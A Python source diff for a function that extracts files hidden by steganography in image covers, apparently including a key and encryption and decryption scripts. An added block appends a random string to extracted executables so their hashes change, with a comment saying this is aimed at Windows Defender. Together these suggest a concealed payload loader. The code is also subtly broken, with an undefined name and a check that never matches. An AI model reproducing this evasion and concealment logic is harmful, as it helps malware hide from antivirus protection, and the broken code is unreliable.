@@ -1,4 +1,5 @@
 import subprocess
+import os
 
 
 def extract_message(cover_file_path: str, passphrase: str):
@@ -12,10 +13,10 @@ def extract_message(cover_file_path: str, passphrase: str):
     """
 
     steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]
+    executable_files: list[str] = ["decryption.exe", "decryption.py", "encryption.exe", "encryption.py"]
 
-    # TODO: Use the os module to iterate through current directory to find the pathway to steghide.exe
+    # TODO: Use the os module to iterate through current directory to find the pathway to steghide.exe if needed
     steghide_path = '"steghide-0.5.1-win32\steghide\steghide.exe"'
-    extracted_file: str = ""
 
     # Checks the compatibility of the file type with Steghide
     _, cover_file_type = cover_file_path.split(".")
@@ -23,15 +24,29 @@ def extract_message(cover_file_path: str, passphrase: str):
         raise TypeError("Unsupported file for Steghide detected!")
 
     # TODO: Change this to the name of the appropriate file
-    key_file_name = "White_shark.jpg"
-    code_file_name = "Greenland_Shark.bmp"
+    image_containing_key = "White_shark.jpg"
+    image_containing_encryption_code = "Greenland_Shark.bmp"
+    image_containing_decryption_code = "File.bmp"
 
-    if cover_file_path == key_file_name:
-        extracted_file = "key.txt"
-    elif cover_file_type == code_file_name:  # our .bmp file cone
-        extracted_file = "code.txt"
-    else:
+    # Verifies that the needed images are indeed available; to help with testing
+    if os.path.exists(cover_file_path):
         pass
+    else:
+        raise FileNotFoundError(f"The image name/path '{cover_file_path}' does not exist in the current directory."
+                                f"Either the name fed to the variable in the code to be updated or the image "
+                                 f"specified just doesn't exist.")
+
+    # TODO: Make sure the text file being embedded into contains these names
+    # TODO: Test with .exe files
+    if cover_file_path == image_containing_key:
+        extracted_file = "key.txt"
+    elif cover_file_path == image_containing_encryption_code:  # our .bmp file containing the logic to encrypt
+        extracted_file = "encryption.py"
+    elif cover_file_path == image_containing_decryption_code:  # our .bmp file containing the logic to decrypt
+        extracted_file = "decryption.py"
+    else:
+        raise FileNotFoundError("Unexpected file name passed as cover file. "
+                                "Try updating the name of the variable 'cover_file_path'")
 
     print("Cover file:", cover_file_path)
     print("File written to:", extracted_file)
@@ -57,10 +72,10 @@ def extract_message(cover_file_path: str, passphrase: str):
         # Checks if the file being extracted already exists
         if errors == (f'the file "{extracted_file}" does already exist. overwrite ? (y/n) steghide: could not get '
                       f'terminal attributes.\n'):
-            raise Exception("NOTICE: You're attempting to overwrite a file that already exists.")
+            raise FileExistsError("NOTICE: You're attempting to overwrite a file that already exists.")
         # Checks if wrong passphrase was inputted
         elif errors == "steghide: could not extract any data with that passphrase!\n":
-            raise Exception("NOTICE: Incorrect passphrase inputted")
+            raise ValueError("NOTICE: Incorrect passphrase inputted")
         # The subprocess must have run without error
         else:
             # Reads the contents of the file and prints them in the console
@@ -76,5 +91,18 @@ def extract_message(cover_file_path: str, passphrase: str):
         print(e)
         return
 
+    # Ensures the likelihood that an executable file will have a unique hash for Windows Defender
+    if cover_file_path in executable_files:
+        import random
+
+        # Generates a random string consisting of 30 random ASCII characters
+        rand_generated_str: str = ""
+        for _ in range(30):
+            rand_generated_str += random.choice(ascii.__str__())
+
+        # Appends randomized string to end of executable file
+        contents += f"\nprint({rand_generated_str})"
+
     # Returns the embedded code in a string format
     return contents
+
